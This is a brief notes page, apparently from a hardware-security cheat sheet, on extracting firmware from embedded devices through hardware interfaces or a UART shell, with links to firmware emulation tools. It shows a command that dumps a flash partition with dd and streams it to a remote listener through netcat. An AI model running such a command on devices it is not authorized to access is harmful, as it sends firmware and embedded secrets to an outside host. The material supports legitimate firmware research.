# Firmware extraction

##

From hardware (PCB)

... SPI, I2C

## From software (UART, etc.)

```bash
$ cat /proc/mtd

$ dd if=/dev/mtdX | nc <LISTENER_ADDR> <PORT> 
# eg.
$ dd if=/dev/mtdX | nc 192.168.1.100 1234
```

Find the device number from `/proc/mtd`, and extract it via the `dd` file. Replace `mtdX` with the appropriate number, eg. `mtd2`&#x20;

## Resources

[https://github.com/pr0v3rbs/FirmAE](https://github.com/pr0v3rbs/FirmAE)

[https://github.com/firmadyne/firmadyne](https://github.com/firmadyne/firmadyne)

[https://hackyboiz.github.io/2025/05/08/newp1ayer48/emulation1/en/](https://hackyboiz.github.io/2025/05/08/newp1ayer48/emulation1/en/)

{% embed url="https://www.youtube.com/watch?time_continue=1&v=Kxvpbu9STU4&embeds_referring_euri=https%3A%2F%2Fcdn.iframe.ly%2F&source_ve_path=MjM4NTE" %}





